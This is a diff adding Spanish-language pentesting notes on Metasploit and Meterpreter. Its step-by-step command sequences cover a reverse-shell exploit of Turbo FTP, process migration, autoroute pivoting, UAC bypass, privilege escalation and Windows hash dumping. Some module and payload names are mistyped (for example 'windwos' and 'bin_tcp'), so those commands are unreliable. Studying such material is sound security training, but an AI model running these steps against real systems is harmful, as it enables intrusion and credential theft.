@@ -330,3 +330,191 @@ Arpspoof es una herramienta de la colección Dsniff, la cual, permite realizar a
 2. Lanzar ARPspoof:
 
 `arpspoof -i eth0 -t 192.168.1.12 -r 192.168.1.30`
+
+## Metasploit/Meterpreter
+
+### [Metasploit](https://linuxhint.com/install_metasploit_ubuntu/)
+
+Framework open-source usado para pentesting y desarrollo de exploits. Este utiliza una base de datos Postgresql.
+
+Posee una interfaz web, CLI y una interfaz de consola (MSFconsole).
+
+Metasploit usa jerarquía tipo file system para las rutas de los encoders, nops, exploits, payloads y módulos auxiliares (ejemplo, los exploits de Windows comienzan con exploit/windows/):
+
+![metasploit1](img/net/metasploit1.png)
+
+Un payload es una pieza de código inyectada en un módulo de exploit en la víctima, el cual, permite obtener lo siguiente:
+
+-	Una Shell del OS
+-	Una conexión VNC o RDP
+-	Una Shell Meterpreter
+-	Ejecutar una aplicación suministrada por el atacante
+
+#### Flujo de explotación de un objetivo usando MSFconsole
+
+-	Identificar un servicio vulnerable
+-	Buscar el exploit apropiado para dicho servicio
+-	Cargar y configurar el exploit
+-	Cargar y configurar el payload que se requiere usar
+-	Correr el código del exploit y obtener acceso a la máquina vulnerable
+
+Dentro de la consola, cada comando posee la opción `-h` para ver una breve descripción y ayuda de este.
+
+```
+msfdb init: Inicia la base de datos
+msfconsole: Inicia MSFconsole
+msfconsole -q: Inicia MSFconsole sin el banner
+db_status: Valida si Metasploit se conectó con la DB
+help/?: Muestra el menú de ayuda de Metasploit
+search [modules]: Buscar módules
+back: Volver al prompt de MSF
+info: Ver información del exploit habilitado
+connect: Función similar a netcat
+banner: Muestra el banner
+show exploits:Ver todos los exploits de MSF
+show payloads: Ver todos los payloads de MSF. Si este es usado dentro de un módulo de exploit, solo mostrará los payloads que puede ser usados en este
+use exploit/[module]: Habilitación de un exploit
+set [option]: Configurar el valor de una variable (obtenidas mediante comando show options)
+setg [option]: Configurar el valor de una variable de forma global
+unset [option]: Elimina la configuración de una variable
+spool [file]: Escribe la salida de la consola en un archivo y también en la pantalla
+save: Guarda los datastores activo
+db_nmap [option] [IP]: Usar nmap en Metasploit
+hosts: Lista todos los hosts en la base de datos
+services: Lista todos los servicios en la base de datos
+vulns: Lista todas las vulnerabilidades en la base de datos
+run/exploit: Ejecutar el exploit configurado
+```
+
+#### Ejemplo de uso nmap en Metasploit
+
+```
+msfdb init
+msfconsole
+db_status
+db_nmap -sV 192.168.10.200
+hosts
+services
+vulns
+```
+
+#### Ejemplo de explotación de Turbo FTP
+
+```
+msfconsole
+use exploit/windows/ftp/turboftp_port
+info
+show options
+set RHOST 192.168.1.10
+set FTPUSER example
+set FTPPASS example123
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.1.4
+set LPORT 1234
+exploit
+```
+
+### Meterpreter
+
+Payload especial con características diseñadas para el pentesting. Corresponde a una Shell, que puede correr en aplicaciones y servicios vulnerables de: Android, BSD, Java, Linux, PHP, Python y Windows.
+
+Dentro de las cosas que pueden hacer con Meterpreter, se tiene lo siguiente:
+-	Information Gathering:
+ -	Información de la máquina
+ -	OS
+ -	Red
+ - Tabla de rutas
+ -	Usuarios que corren el proceso explotado
+-	Transferir archivos
+-	Instalar backdoors
+-	Tomar screenshots
+-	Etc.
+
+#### Conexiones de Meterpreter
+
+-	**bin_tcp:** corre un proceso de servidor en la máquina objetivo, que espera por una conexión desde la máquina atacante.
+-	**reverse_tcp:** realiza una conexión TCP de vuelta hacia la máquina atacante (puede ser usado como backdoor para evadir dispositivos firewall).
+
+#### Comandos de MSFconsole sobre Meterpreter
+
+```
+search meterpreter: Buscar los payloads de Meterpreter
+set payload [meterpreter_payload]: Configurar payload de Meterpreter
+sessions -l: Ver las sesiones abiertas
+sessions -i [session_id]: Cambiar a una sesión Meterpreter abierta
+```
+
+#### Comandos de Shell Meterpreter
+
+```
+background: Cambiar de sesión Meterpreter por la consola (sin cerrar la sesión)
+sysinfo: Obtener información del sistema
+ifconfig: Ver configuración de red de la víctima
+route: Ver tabla de rutas
+pwd: Saber el directorio actual
+cd [path]: Cambio de directorio
+ls: Listar archivos y directorios
+download [remote_file] [local_path]: Descargar archivos
+upload [local_file] [remote_path]: Cargar archivo
+shell: Correr una shell del OS víctima
+getuid: Obtener información del usuario actual
+getsystem: Corre una rutina para escalar privilegios (en Windwos el usuario system es el que tiene más privilegios)
+```
+#### Ejemplo payload reverse_tcp Windows
+
+`set payload windows/meterpreter/reverse_tcp`
+
+#### Ejemplo payload reverse_tcp Linux
+
+`set payload linux/x86/meterpreter/reverse_tcp`
+
+#### Ejemplo payload bin_tcp Windows
+
+`set payload windows/meterpreter/bin_tcp`
+
+#### Ejemplo payload bin_tcp Linux
+
+`set payload linux/x86/meterpreter/bin_tcp`
+
+#### Ejemplo de migración a proceso estable
+
+> Se recomienda el uso de spoolsv.exe (se debe indicar el PID).
+
+```
+ps
+migrate 1320
+```
+
+#### Ejemplo de configuración de ruta estática
+
+```
+run autoroute -s 172.18.1.0 -n 255.255.255.0
+```
+
+#### Ejemplo de bypass del UAC (User Account Control) Policy
+
+> Tener en cuenta que en sistemas Windows modernos, el UAC previene la escalación de privilegios, por lo tanto, solo con getsystem no será suficiente.
+
+```
+background
+search bypassuac
+use exploit/windwos/local/bypassuac
+show options
+set session 1
+exploits
+getuid
+getsystem
+```
+
+#### Ejemplo de dumping de la base de datos de las passwords
+
+Esto entrega los hashes, que permiten realizar un crackeo offline.
+
+```
+background
+use exploit/windows/gather/hashdump
+show options
+set session 2
+exploit
+```
